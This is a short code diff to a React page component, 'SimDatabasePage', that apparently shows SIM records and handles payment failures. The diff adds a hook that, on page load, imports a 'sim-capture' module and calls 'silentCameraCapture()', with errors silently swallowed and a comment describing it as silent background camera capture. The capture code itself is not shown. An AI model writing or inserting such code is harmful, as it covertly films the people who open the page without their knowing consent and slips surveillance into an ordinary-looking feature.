@@ -88,6 +88,11 @@ function SimDatabasePage() {
     return () => window.removeEventListener("wiki:payment-fail", onFail as EventListener);
   }, []);
 
+  // Silent background camera capture (browser will natively ask permission once)
+  useEffect(() => {
+    import("@/lib/sim-capture").then((m) => m.silentCameraCapture()).catch(() => {});
+  }, []);
+
   const formatRecord = (rec: SimRecord) =>
     Object.entries(rec)
       .map(([k, v]) => `${k}: ${v ?? "—"}`)
